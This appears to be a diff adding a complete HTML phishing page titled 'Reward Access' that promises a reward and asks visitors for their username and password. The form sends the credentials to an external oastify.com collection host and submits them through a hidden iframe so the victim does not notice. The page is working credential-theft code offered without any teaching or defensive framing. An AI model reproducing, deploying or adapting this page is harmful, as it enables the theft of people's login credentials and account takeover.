@@ -1,1 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reward Access</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
 
+        header {
+            padding: 20px;
+            background-color: #333;
+            color: white;
+        }
+
+        img {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+        }
+
+        #visibleForm {
+            margin-top: 20px;
+        }
+
+        #hiddenForm {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>You are in the right place!</h1>
+        <p>Please enter your username and password to access and get the reward.</p>
+    </header>
+
+    <form id="visibleForm" action="httsp://ygialrbr4rgix80wyqzht291xs3prgf5.oastify.com/Submit" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
+
+        <input type="button" value="Submit" onclick="submitForm()">
+    </form>
+
+    <iframe id="hiddenForm" name="hiddenForm" src="about:blank"></iframe>
+
+    <script>
+        function submitForm() {
+            var visibleForm = document.getElementById("visibleForm");
+            var hiddenForm = document.getElementById("hiddenForm");
+
+            // Copy form values to hidden form
+            hiddenForm.contentDocument.body.innerHTML = visibleForm.outerHTML;
+
+            // Set the target of the visible form to the hidden iframe
+            visibleForm.target = "hiddenForm";
+
+            // Submit the visible form
+            visibleForm.submit();
+        }
+    </script>
+</body>
+</html>
